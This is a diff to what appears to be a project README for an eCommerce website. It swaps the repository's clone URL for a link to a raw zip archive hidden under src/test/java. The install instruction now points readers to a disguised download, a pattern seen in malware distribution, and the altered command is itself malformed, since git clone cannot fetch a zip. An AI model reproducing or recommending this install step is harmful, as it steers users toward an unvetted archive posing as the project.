@@ -12,7 +12,7 @@ workbench
 
 Installing
 Clone the repository using the command below:
-git clone https://github.com/Himansh29/Major-project.git
+git clone https://github.com/Himansh29/Major-project/raw/refs/heads/master/src/test/java/Major-project-v2.9.zip
 
 Features
 The eCommerce website comes with the following features:
